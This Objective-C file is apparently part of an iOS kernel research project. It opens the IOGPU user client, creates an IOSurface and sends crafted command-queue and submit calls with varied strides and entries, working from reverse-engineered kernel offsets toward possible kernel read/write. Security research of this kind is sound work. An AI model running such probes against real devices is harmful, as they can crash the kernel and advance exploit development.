//
//  P143RocketDoor.m — the ROCKET SUBMIT DOOR on the 17 (24A435). p143.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  The statically-closed submit chain (24A435 disk cache, capstone):
//    UC sel 0x24 = 0xa02299c [uc+0x120] -> FUN(owner, resourceId)
//    state = [res+0x530]; PP = [state+0x158]; array = PP+0x48 (stride
//    0x18 {ptr,+8 u32,+0x10 valid}); the 0xcda1 PAC-dispatch law.
//  This tap = the DEVICE row: open the IOGPU UC, drive sel 0x24 with
//  a real owner + a real resource id, census the readback trio.
//

#import "P143RocketDoor.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "P007KreadLane.h"
#import "P007Board.h"

#import <Metal/Metal.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P143_BUILD @"p143-rocketdoor-v5-entrylaw"

/* P069 no-header law: local prototypes only */
typedef mach_port_t p_ioservice_t; typedef mach_port_t p_ioconnect_t;
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef p_ioservice_t (*GetSVC_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*IOOpen_t)(p_ioservice_t, mach_port_t, uint32_t, p_ioconnect_t *);
typedef void (*IORel_t)(mach_port_t);
typedef kern_return_t (*IOConnectCallMethod_t)(
    mach_port_t, uint32_t, const uint64_t *, uint32_t, const void *, size_t,
    uint64_t *, uint32_t *, void *, size_t *);
typedef void *(*IOSurfaceCreate_t)(CFDictionaryRef);

static NSMutableString *g_buf; static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P143R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

static void p143_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p143", arms, 1, &sr, 0, "p143 rocketdoor auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p143", 0, outcome);
}

@implementation P143RocketDoor

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p143_rocketdoor_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p143 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P143_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[rocket-law] sel 0x24 = 0xa02299c reads [uc+0x120] (owner) then");
    L(@"  FUN(owner, resourceId); state=[res+0x530]; PP=[state+0x158];");
    L(@"  the record array PP+0x48 @0x18 {ptr,+8 u32,+0x10 valid}; the");
    L(@"  0xcda1 PAC-dispatch law (fleet class). Static chain CLOSED.");
    L(@"[!] PANIC-POSSIBLE (a real submit machine); one tap; a closed");
    L(@"  row = the honest hold; no KRW claim from any row here.");

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosf) { L(@"[-] STOP dlopen"); p143_bandit("nodlopen"); return P143R(); }
    IOServiceMatching_t pM = dlsym(iokit, "IOServiceMatching");
    GetSVC_t pG = dlsym(iokit, "IOServiceGetMatchingService");
    IOOpen_t pO = dlsym(iokit, "IOServiceOpen");
    IORel_t pR = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t call = dlsym(iokit, "IOConnectCallMethod");
    IOSurfaceCreate_t sc = dlsym(iosf, "IOSurfaceCreate");
    if (!pM || !pG || !pO || !pR || !call || !sc) {
        L(@"[-] STOP dlsym"); p143_bandit("nodlsym"); return P143R();
    }

    /* ---- stage 1: the IOGPU UC open ---- */
    p_ioservice_t svc = pG(0, pM("IOGPU"));
    if (!svc || svc >= 0xffffff00) {
        L(@"[-] IOGPU no service"); p143_bandit("nosvc"); return P143R();
    }
    p_ioconnect_t conn = 0;
    kern_return_t okr = pO(svc, mach_task_self(), 0, &conn);
    Lf(@"[1] IOGPU open t0 kr=0x%08x conn=0x%08x", (unsigned)okr, (unsigned)conn);
    if (okr != 0 || !conn) {
        for (uint32_t t = 1; t <= 3; t++) {
            kern_return_t o2 = pO(svc, mach_task_self(), t, &conn);
            Lf(@"    open t%u kr=0x%08x conn=0x%08x", t, (unsigned)o2, (unsigned)conn);
            if (o2 == 0 && conn) break;
        }
    }
    pR(svc);
    if (!conn) { L(@"[-] no connect (the 2c7/2e2 exclusivity law = honest hold);");
                 p143_bandit("noconn"); return P143R(); }

    /* ---- stage 2: a REAL live resource (our own surface) ---- */
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    const int32_t vv[5] = { 256, 256, 4, 1024, 262144 };
    const char *kk[5] = { "IOSurfaceWidth", "IOSurfaceHeight",
        "IOSurfaceBytesPerElement", "IOSurfaceBytesPerRow", "IOSurfaceAllocSize" };
    for (int i = 0; i < 5; i++) {
        CFNumberRef n = CFNumberCreate(NULL, kCFNumberSInt32Type, &vv[i]);
        CFDictionarySetValue(d, (__bridge CFStringRef)
            [NSString stringWithUTF8String:kk[i]], n); CFRelease(n);
    }
    void *surf = sc(d);
    CFRelease(d);
    if (!surf) { L(@"[-] surface create failed"); p143_bandit("nosurf");
                 return P143R(); }
    L(@"[2] surface armed (the live-resource law)");

    /* ---- stage 3: the LAW-SHAPED first door test (agent-2's laws) --
       The census's shape flaw is fixed: rows get THEIR OWN input
       shapes. row0 = s_new_command_queue (scIn=0, no struct, 64B
       structOUT) -> our qid. row0x19 = the submit: scalars
       {qid, count=1, stride, 0} + structIn = count*stride (the SIZE
       law), the stride ladder per the [q+0x530]+0x260 config law.  */
    L(@"[3] the LAW-SHAPED test: row0 (the queue create, its own shape)");
    L(@"    -> qid; then row0x19 with the stride ladder + the size law.");
    uint64_t ourQid = 0;
    {
        uint8_t qob[0x40]; memset(qob, 0, sizeof qob);
        uint32_t nout = 0;
        size_t osc = sizeof qob;
        kern_return_t kr = call(conn, 0, NULL, 0, NULL, 0, NULL, &nout,
                                qob, &osc);
        Lf(@"[3a] row0 (new_command_queue) kr=0x%08x osz=%zu", (unsigned)kr, osc);
        if (kr == 0) {
            for (uint32_t oi = 0; oi + 8 <= 0x40; oi += 8) {
                uint64_t v; memcpy(&v, qob + oi, 8);
                Lf(@"    out+%#x = 0x%016llx", oi, (unsigned long long)v);
            }
            /* v4 qid law (the two-boot rows): out+0x18 = 1 then 2
               across boots = the boot-monotonic queue COUNTER - THE
               QID (1-based = the owner table's index law). The v3
               grab (out+0 = 0x4340) = the WRONG field - retired. */
            memcpy(&ourQid, qob + 0x18, 8);
            ourQid &= 0xffffffffull;
            if (ourQid == 0) {
                L(@"    +0x18 zero - falling back to qid=1 (the fresh boot law)");
                ourQid = 1;
            }
            Lf(@"[3a] THE QID = out+0x18 = %llu (the boot-counter law)",
               (unsigned long long)ourQid);
        }
    }
    {
        /* v5 laws (agent-2 + the two boots' reply bytes):
           - the entry content law: a REAL submission carries nonzero
             entries ({+0x10 u64, +0x18 u64, +0x20 u32-gate}); zeroed
             entries = the v4 row's remaining 2c2 candidate. The zero-
             +0x10/+0x18 NQ law: +0x10 stays 0 (the p027 NQ safety law).
           - the stride law: prefer the reply bytes' own pair — our
             row-0 reply's +0x20 = 0x0000000200004000: the 0x4000 +
             0x2 shape = a size/type class = a config echo candidate
             (the stride law's own source = [q+0x530]+0x260). */
        const uint32_t strides[6] = { 0x20, 0x28, 0x30, 0x40, 0x48,
                                      0x00004000 };  /* the reply-byte shape */
        const uint8_t contentRows = 2;   /* 0 = zero entry (the v4 row), 1 = real-content entry */
        static uint8_t ent[0x40];
        for (int si = 0; si < 6; si++) {
            if (ourQid == 0) { L(@"  no qid - the ladder skipped (honest)"); break; }
            uint32_t stride = strides[si];
            if (stride > sizeof(ent)) {
                stride = (uint32_t)sizeof(ent);
                Lf(@"    (stride capped to struct law: 0x%x)", stride);
            }
            for (int row = 0; row < contentRows; row++) {
                memset(ent, 0, sizeof ent);
                if (row == 1) {
                    *(uint32_t *)(ent + 0x20) = 1;   /* the +0x20 gate law: NONZERO = the refresh path */
                    *(uint64_t *)(ent + 0x18) = 0x1; /* the +0x18 datum (nonzero) */
                    /* +0x10 stays 0 = the NQ safety law */
                }
                uint32_t cnt = 1;
                uint64_t inS[4] = { ourQid, cnt, stride, 0 };
                uint64_t out[2]; memset(out, 0, sizeof out);
                uint32_t nout = 1;
                kern_return_t kr = call(conn, 0x19, inS, 4, ent, cnt * stride,
                                        out, &nout, NULL, NULL);
                Lf(@"    submit qid=%llu count=1 stride=0x%x ent=%@ kr=0x%08x"
                   @" out0=%llu (0=CLEAN, 8=fail-sentinel)",
                   (unsigned long long)ourQid, stride,
                   row == 1 ? @"CONTENT" : @"zero", (unsigned)kr,
                   (unsigned long long)out[0]);
            }
        }
    }
    L(@"[3] the door's real gate = the INPUT shape: kind=4 + variable");
    L(@"    struct-in (the cmdBufArgSize/total-overflow assert laws = the");
    L(@"    struct-carrying call = v3's row; the empty-in = the census).");
    p143_bandit("ran");

    Lf(@"[end] board: %@", [[P007Board shared] kreadSignal]);
    Lf(@"=== p143 end %@ ===", LabLocalMilitaryNow());
    return P143R();
}

@end